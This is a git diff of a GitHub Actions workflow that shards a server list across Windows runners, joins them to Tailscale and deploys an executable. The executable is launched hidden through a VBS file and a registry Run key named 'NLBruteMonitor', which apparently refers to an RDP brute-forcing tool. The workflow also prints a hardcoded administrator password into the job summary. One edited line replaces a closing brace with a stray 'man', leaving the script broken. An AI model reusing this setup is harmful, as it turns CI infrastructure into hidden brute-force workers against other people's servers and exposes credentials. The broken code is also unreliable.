@@ -9,7 +9,7 @@ on:
         default: '10'
 
 jobs:
-  # JOB 1: Calculates the range using Bash/Python
+  # JOB 1: Calculates the range
   setup:
     runs-on: ubuntu-latest
     outputs:
@@ -39,7 +39,7 @@ jobs:
       - name: 1. Checkout Repo
         uses: actions/checkout@v4
 
-      - name: 2. Setup Workspace & Validate Input
+      - name: 2. Setup Workspace
         shell: powershell
         run: |
           $maxServers = [int]${{ github.event.inputs.total_servers }}
@@ -59,7 +59,7 @@ jobs:
           
           Write-Host "Initializing Server ID: $currentId" -ForegroundColor Cyan
 
-      - name: 3. Split servers.txt (Dynamic Partitioning)
+      - name: 3. Split servers.txt
         shell: powershell
         run: |
           $maxServers = [int]$env:MAX_SERVERS
@@ -78,7 +78,6 @@ jobs:
           $countToTake = if ($currentId -eq $maxServers) { $totalLines - $startIndex } else { $linesPerServer }
 
           $serverLines = $allLines | Select-Object -Skip $startIndex -First $countToTake
-
           if ($null -eq $serverLines -or $serverLines.Count -eq 0) { exit 1 }
 
           $serverLines | Out-File -FilePath $outputFile -Encoding ascii -Force
@@ -108,18 +107,7 @@ jobs:
           Start-Sleep -Seconds 8
           $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
           
-          # SAVE IMMEDIATELY to Environment and Summary
           echo "TAILSCALE_IP=$ts_ip" >> $env:GITHUB_ENV
-          
-          # Write to Step Summary immediately so it shows up in the UI ASAP
-          $summary = @"
-          ### 🟢 [Server ${{ matrix.server_id }}] Connection Established
-          **Tailscale IP:** `$ts_ip`
-          **Status:** `Connecting...`
-          ---
-          "@
-          $summary | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Encoding utf8 -Append
-          
           Write-Host "Tailscale IP : $ts_ip" -ForegroundColor Yellow
 
       - name: 7. Deploy App & Setup Autostart
@@ -211,7 +199,7 @@ jobs:
               $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
               $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
               New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
-          }
+           man
 
       - name: 8. Generate Deployment Summary
         if: always()
@@ -220,17 +208,17 @@ jobs:
           $ip = $env:TAILSCALE_IP
           if ($null -eq $ip) { $ip = "N/A" }
           
-          $summary = @"
-          ### 🚀 Deployment Status: Server ${{ matrix.server_id }}
-          | Metric | Value |
-          | :--- | :--- |
-          | **Tailscale IP** | `$ip` |
-          | **Status** | `Deployed` |
-          | **User** | `NvdAdmin` |
-          | **Password** | `P@ssw0rd1qazXSW@#` |
-          ---
-          "@
+          # Writing a clean Markdown block to the summary
+          $summary = "### 🚀 Server ${{ matrix.server_id }} Status`n"
+          $summary += "| Metric | Value |`n"
+          $summary += "| :--- | :--- |`n"
+          $summary += "| **Tailscale IP** | `$ip` |`n"
+          $summary += "| **Status** | `Deployed` |`n"
+          $summary += "| **User** | `NvdAdmin` |`n"
+          $summary += "| **Password** | `P@ssw0rd1qazXSW@#` |`n"
+          $summary += "---`n"
           
+          # Output to the summary file
           $summary | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Encoding utf8 -Append
           Write-Host "Summary updated for Server ${{ matrix.server_id }}" -ForegroundColor Cyan
 
